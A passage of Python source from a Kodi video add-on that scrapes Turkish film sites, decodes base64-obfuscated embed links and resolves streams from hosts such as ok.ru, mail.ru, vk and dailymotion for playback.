            playList = xbmc.PlayList(xbmc.PLAYLIST_VIDEO)
            playList.clear()
            addLink('[COLOR blue]'+'RETURN List <<'+' [/COLOR]','','http://png-4.findicons.com/files/icons/1714/dropline_neu/128/edit_undo.png')
            listitem = xbmcgui.ListItem(name)
            playList.add(url, listitem)
            xbmcPlayer.play(playList)
            exec_version = float(str(xbmc.getInfoLabel("System.BuildVersion"))[0:4])
            if exec_version < 14.0:
                    playlist()
            else:
                    playlist2()
    match95=re.compile('file: \'(.*?)\',\n\t\t\t\twidth').findall(link)
    for url in match95:
        yenical4(name,url)
#--
#42
def yenical4(name,url):
    xbmcPlayer = xbmc.Player() 
    playList = xbmc.PlayList(xbmc.PLAYLIST_VIDEO) 
    playList.clear() 
    addLink(name,url,'')
    listitem = xbmcgui.ListItem(name) 
    playList.add(url, listitem) 
    xbmcPlayer.play(playList)
#--
#99
def magix_player(name,url):
        if "www.dailymotion.com" in url:
            fix.daily_sec(name,url)
        elif "mail." in url:
            MailRu_Player(url)
        elif "ok." in url:
            ok_ru(url)
        else:
            UrlResolverPlayer = url
            playList.clear()
            media = urlresolver.HostedMediaFile(UrlResolverPlayer)
            source = media
            if source:
                url = source.resolve()
                addLink(name,url,'')
                playlist_yap(playList,name,url)
                xbmcPlayer.play(playList)
#--
#29
def ayrisdirm1(url):
    link=get_url(url)
    try:
        ply=re.compile('\/pusuk\/url\/(.*?)"').findall(link)
        for name in ply:
            name=name.replace('?mode=flash','')
            name=base64.b64decode(name)
            reverseName=""
            for x in range(len(name)-1,-1,-1):
                    reverseName+=name[x]
            reverseName=base64.b64decode(reverseName)
            reverseName=reverseName.replace('ok/','')
            url=reverseName
            url = 'http://ok.ru/videoembed/'+str(url).encode('utf-8', 'ignore')
            ok_ru(url)
        ply1=re.compile('\/pusuk\/url\/(.*?)=').findall(link)
        for name in ply1:
            name=name+'='
            name=base64.b64decode(name)
            reverseName=""
            for x in range(len(name)-1,-1,-1):
                    reverseName+=name[x]
            reverseName=base64.b64decode(reverseName)
            url=reverseName
            url=url.replace('/mail','')
            url = 'http://videoapi.my.mail.ru/videos/embed/'+url+'.html'
            magix_player(name,url)
    except:
        pass
    
    req = urllib2.Request(url)
    req.add_header("User-Agent","Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36")
    response = urllib2.urlopen(req)
    link=response.read()
    response.close()
    hqq=re.compile('src="https://hqq.tv/(.*?)"').findall(link)
    for url in hqq:
        url = 'https://hqq.tv/'+url
        url=url.replace('#038;','')
        hqq(url)
    ply10=re.compile('src="http:\/\/www.ultrafilmizle.com\/player\/url\/(.*?)"').findall(link)
    for name in ply10:
        name=base64.b64decode(name)
        reverseName=""
        for x in range(len(name)-1,-1,-1):
                reverseName+=name[x]
        reverseName=base64.b64decode(reverseName)
        reverseName=reverseName.replace('ok/','')
        url=reverseName
        value=[]
        url = 'http://ok.ru/videoembed/'+str(url)
        magix_player(name,url)
    ytt=re.compile('TEK PLUS--><br />\n<iframe width=".*?" height=".*?" src="(.*?)"').findall(link)
    for url in ytt:
        link=get_url(url)
        match=re.compile('file":"(.*?)"').findall(link)
        name='TEK PLUS Sec'
        for url in match:
            addLink('[COLOR beige][COLOR orange]>[/COLOR]'+name+'[/COLOR]',url,'')
    yt=re.compile('youtube.com/embed/(.*?)"').findall(link)
    for code in yt:
        url = 'http://www.youtube.com/embed/'+code
        name='Fragman'
        magix_player(name,url)
    ok2=re.compile('ok.ru\/videoembed\/(.*?)"').findall(link)
    for code in ok2:
        url = 'http://ok.ru/videoembed/'+str(code)
        name='OK RU  '
        ok_ru(url)
    vk_2=re.compile('video_ext.php\?oid\=(.*?)"').findall(link) 
    for code in vk_2:
        url = 'http://vk.com/video_ext.php?oid='+str(code)
        url=url.replace('&amp;', '&').replace('&#038;', '&').replace('%3A',':').replace('%2F','/').replace('%3F','?').replace('%3D','=').replace('%26','&').replace('%2F','/') 
        name='Vk - Play'
        addDir('[COLOR yellow]'+name+'[/COLOR]',url,1030,'',"")
    mailru2=re.compile('videos\/embed\/mail\/(.*?).html').findall(link)
    for code in mailru2:
        url = 'http://videoapi.my.mail.ru/videos/embed/mail/'+str(code)+'.html'
        name='mail RU  '
        addDir('[COLOR blue]'+name+'[/COLOR]',url,99,"","")
    mailru22=re.compile('https://my.mail.ru/(.*?)\' width=').findall(link)
    for url in mailru22:
        url = 'https://my.mail.ru/'+url
        link=get_url(url)
        match=re.compile('movieSrc":"mail/(.*?)","metadataUrl').findall(link)
        for url in match:
            url = 'http://videoapi.my.mail.ru/videos/embed/mail/'+str(url)+'.html'
            name='mail RU  '
            magix_player(name,url)
    upto=re.compile('src="http://uptostream.com/iframe/(.*?)"').findall(link)
    for url in upto:
        url = 'http://uptostream.com/iframe/'+url
        name='play'
        magix_player(name,url)
    vidag=re.compile('http://vid.ag/(.*?)"').findall(link) 
    for url in vidag: 
        url = 'http://vid.ag/'+str(url).encode('utf-8', 'ignore')
        name='Play'
        addDir('[COLOR yellow]'+name+'[/COLOR]',url,99,"",'')
    dd=re.compile('src="http://videomega.tv/view.php\?ref\=(.*?)\&width').findall(link) 
    for url in dd: 
        url = 'http://videomega.tv/view.php?ref='+str(url).encode('utf-8', 'ignore')
        name='Play'
        addDir('[COLOR yellow]'+name+'[/COLOR]',url,99,"",'')
    ddo=re.compile('src="https://openload.co/embed/(.*?)"').findall(link) 
    for url in ddo: 
        url = 'https://openload.co/embed/'+str(url).encode('utf-8', 'ignore')
        name='Play'
        addDir('[COLOR yellow]'+name+'[/COLOR]',url,99,"",'')
    vk_9=re.compile('video_ext.php\?oid\=(.*?)"').findall(link) 
    for url in vk_9: 
        url = 'http://vk.com/video_ext.php?oid='+str(url).encode('utf-8', 'ignore')
        name='Play'
        url=url.replace('&amp;', '&').replace('&#038;', '&').replace('%3A',':').replace('%2F','/').replace('%3F','?').replace('%3D','=').replace('%26','&').replace('%2F','/') 
        addDir('[COLOR yellow]'+name+'[/COLOR]',url,1030,"",'')

def frame(url):
    link=get_url(url)
    match=re.compile('class="c5"><p><iframe src="(.*?)"').findall(link)
    for url in match:
        dizividcal(url)
    matchc=re.compile('<iframe src="(.*?)" width=').findall(link)
    for url in matchc:
        if "reklam" in url:
            pass
        else:
            dizividcal(url)
    matcha=re.compile('src="http://www.daily(.*?)\?').findall(link)
    for url in matcha:
        url='http://www.daily'+url
        dizividcal(url)
    matchaa=re.compile('youtube.*?\/embed\/(.*?)\?').findall(link)
    for url in matchaa:
        url='http://www.youtube.com/embed/'+url
        name='Play-Youtube'
        magix_player(name,url)
    matchab=re.compile('ok.ru\/videoembed\/(.*?)"').findall(link)
    for url in matchab:
        url='http://ok.ru/videoembed/'+str(url)
        ok_ru(url)
    ply1=re.compile("videoseyredin.net/embed/(.*?)'").findall(link)
    for url in ply1:
        url='https://www.videoseyredin.net/embed/'+url
        dizividcal(url)
    ply2=re.compile('/playlist/(.*?).json"').findall(link)
    for url in ply2:
        url='https://www.videoseyredin.net/playlist/'+url+'.json'
        dizividcal(url)
    vk=re.compile('vk.com\/(.*?)"').findall(link)
    for url in vk:
        url='http://vk.com/'+url
        url=url.replace('&#038;','&')
        magix_player(name,url)
    okru2=re.compile('".*?\/player\/ok\/1.*?\.php\?v\=(.*?)"').findall(link)
    for url in okru2:
      url=(base64.b64decode(url))
      url=url.replace("http://ok.ru/video/","")
      url='http://ok.ru/videoembed/'+str(url)
      ok_ru(url)
        
        
#24   
def dizividcal(url):
    if "daily" in url:
        req = urllib2.Request(url)
        req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3')
        response = urllib2.urlopen(req)
        link=response.read()
        response.close()
        match=re.compile('"video\\\/mp4","url"\:"(.*?)\/H264\-(.*?)\\\/video(.*?)"').findall(link)
        for a,name2,c in match:
            urlA=a+"/H264-"+name2+"/video"+c
            urlA=urlA.replace('\/','/')
            addLink('[COLOR gold] KALITE SeC >>  '+'[COLOR beige]'+name2+'[/COLOR]'+'[/COLOR]',urlA,'')
    if "itti" in url:
        url=url.replace('https://ittir.in/v/','')
        url='http://dreamtr.club/a_n_d/ornek.php?no='+url
        link=get_url(url)
        match=re.compile('file": ".*?\.googlevideo.com(.*?)",\n                "label": "(.*?)",\n                "type": "mp4"').findall(link)
        for urlA,name in match:
            urlA=urlA.replace('\/','/').replace('%3A',':').replace('%2F','/').replace('%3F','?').replace('%3D','=').replace('%26','&').replace('%2F','/')
            addLink('[COLOR gold] KALITE SeC >>  '+'[COLOR beige]'+name+'[/COLOR]'+'[/COLOR]','https://redirector.googlevideo.com'+urlA,'')
    if "oynat" in url:
        link=get_url(url)
        match4=re.compile('{"file":"(.*?)", "label":"(.*?)"').findall(link)
        for url,name in match4:
            addLink('[COLOR beige]'+name+'[/COLOR]',url,'')
    if "videoseyredin" in url:
        link=get_url(url)
        match1=re.compile('file":"(.*?)","type":"mp4","label":"(.*?)"').findall(link)
        for url,name in match1:
            name="[COLOR orange]Kalite SEC > [/COLOR]"+name
            if "err" in name:
                pass
            else:
                addLink('[COLOR beige][COLOR orange]>[/COLOR]'+name+'[/COLOR]',url,'')
    if "videoseyredin" in url:
        link=get_url(url)
        match1=re.compile('file:"(.*?)",label:"(.*?)p').findall(link)
        for url,name in match1:
            name="[COLOR orange]Kalite SEC > [/COLOR]"+name
            if "err" in name:
                pass
            else:
                url=url.replace('","default":"true','')
                addLink('[COLOR beige][COLOR orange]>[/COLOR]'+name+'[/COLOR]',url,'')
    if "videoseyredin" in url:
        link=get_url(url)
        ply2=re.compile('/playlist/(.*?).json"').findall(link)
        for url in ply2:
            url='https://www.videoseyredin.net/playlist/'+url+'.json'
            link=get_url(url)
            match=re.compile('file": ".*?\.googlevideo.com(.*?)",\n                "label": "(.*?)",\n                "type": "mp4"').findall(link)
            for urlA,name in match:
                urlA=urlA.replace('\/','/').replace('%3A',':').replace('%2F','/').replace('%3F','?').replace('%3D','=').replace('%26','&').replace('%2F','/')
                addLink('[COLOR gold] KALITE SeC >>  '+'[COLOR beige]'+name+'[/COLOR]'+'[/COLOR]','https://redirector.googlevideo.com'+urlA,'')

